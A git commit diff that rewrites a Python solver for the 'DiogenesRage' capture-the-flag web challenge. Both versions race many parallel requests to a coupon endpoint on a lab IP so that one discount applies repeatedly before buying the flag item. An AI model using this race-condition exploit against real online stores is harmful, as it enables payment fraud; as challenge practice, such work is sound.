bc4c3c0cf55974dc5daeb71e810184cd33d38480
szhan21 <shunda.zhang@intel.com>
2023-04-13 21:59:44 +0800

    Solving DiogenesRage.

--- ctf/web/DiogenesRage/dec.py
+++ ctf/web/DiogenesRage/dec.py
@@ -1,40 +1,57 @@
-#!/usr/bin/env python
-
-from concurrent.futures import process
-from email import header
-from multiprocessing import Process, Pool
-from threading import Thread
+# Python program to illustrate
+# the concept of race condition
+# in multiprocessing
+import multiprocessing
 import requests
+import time
 
-url = 'http://134.122.104.91:31894'
+def exploit(u, d, h):
+	for i in range(5):
+		requests.post(u, data=d, headers=h)
 
-def race(cookie):
-    headers = {
-        'Cookie': f'session={cookie}'
-    }
-    try:
-        req = requests.post(url+'/api/coupons/apply', data={'coupon_code': 'HTB_100'}, headers=headers)
-        print(req.text)
-    except Exception:
-        pass
+def perform_transactions(cookie, u):
+	url = f"http://{u}/api/coupons/apply"
+	data = '{"coupon_code":"HTB_100"}'
+	thread = []
+	headers = {"Content-Type" : "application/json"}
+	headers['Cookie'] = "session="+cookie
+	start = time.time()
+	for i in range(16):
+		p1 = multiprocessing.Process(target=exploit, args=(url, data, headers))
+		thread.append(p1)
+	for j in thread:
+		j.start()
 
+	for k in thread:
+		k.join()
+	end = time.time()
+	print(f"{end - start:.5f} sec")
+	print("Done!!")
 
-if __name__ == '__main__':
-    req = requests.post(url+'/api/purchase', data={'item': 'C8'})
-    cookie = req.cookies['session']
-    ps = []
-    for x in range(128):
-        p = Process(target=race, args=(cookie, ))
-        ps.append(p)
+def get_session(url):
+    u = f"http://{url}/api/purchase"
+    d = '{"item":"A2"}'
+    res = requests.post(u, data=d)
+    print(res.text)
+    return res.cookies['session']
 
-    for p in ps:
-        p.start()
+def get_flag(s, url):
+    u = f"http://{url}/api/purchase"
+    d = '{"item":"C8"}'
+    headers = {"Content-Type" : "application/json"}
+    headers['Cookie'] = "session="+s
+    d1 = '{"item":"A1"}'
+    res = requests.post(u, data=d1, headers=headers)
+    print(res.text)
+    res = requests.post(u, data=d, headers=headers)
+    print(res.text)
+    return res.cookies
 
-    for p in ps:
-        p.join()
-
-    req = requests.post(url+'/api/purchase', data={'item': 'B5'}, headers={'Cookie': f'session={cookie}'})
-    print(req.text)
-    
-    req = requests.post(url+'/api/purchase', data={'item': 'C8'}, headers={'Cookie': f'session={cookie}'})
-    print(req.text)
+if __name__ == "__main__":
+	for i in range(10):
+		u = "134.122.104.91:31894"
+		s = get_session(u)
+		perform_transactions(s, u)
+		res = get_flag(s, u)
+		time.sleep(1)
+		print("\n\n")
